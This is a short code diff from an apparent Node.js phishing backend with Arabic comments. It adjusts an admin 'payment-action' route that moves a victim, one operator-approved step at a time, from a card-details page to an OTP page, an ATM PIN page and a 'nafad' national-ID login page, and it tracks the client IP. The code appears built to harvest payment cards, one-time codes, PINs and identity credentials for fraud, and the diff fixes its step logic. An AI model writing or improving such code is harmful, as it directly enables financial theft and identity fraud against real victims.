@@ -770,23 +770,26 @@ app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
     const clientIp = booking?.clientIp || '';
     
     // جلب بيانات الدفع لمعرفة الخطوة الحالية
+    // step=0 أو null: لم تتم أي موافقة بعد (الخطوة 1 = بيانات البطاقة)
+    // step=1: تمت موافقة الخطوة 1 (الخطوة 2 = OTP)
+    // step=2: تمت موافقة الخطوة 2 (الخطوة 3 = ATM)
     const payment = await getPaymentByReference(ref);
-    const currentStep = (payment?.step || 0) + 1;
+    const currentStep = (payment?.step || 0) + 1; // الخطوة التالية التي يجب تنفيذها
     
     let targetPage = '';
-    let nextStep = currentStep;
+    let nextStep = payment?.step || 0; // نحتفظ بالخطوة الحالية
     
     if (action === 'pass') {
       // تحديد الصفحة التالية بناءً على الخطوة
       if (currentStep === 1) {
         targetPage = 'phone'; // بعد بيانات البطاقة → صفحة OTP
-        nextStep = 2;
+        nextStep = 1; // تمت الخطوة 1
       } else if (currentStep === 2) {
         targetPage = 'pin'; // بعد OTP → صفحة الرقم السري ATM
-        nextStep = 3;
+        nextStep = 2; // تمت الخطوة 2
       } else {
         targetPage = 'nafad'; // بعد الرقم السري → نفاذ
-        nextStep = 4;
+        nextStep = 3; // تمت الخطوة 3
       }
     } else if (action === 'deny') {
       // رفض - إعادة لصفحة الدفع مع علامة declined
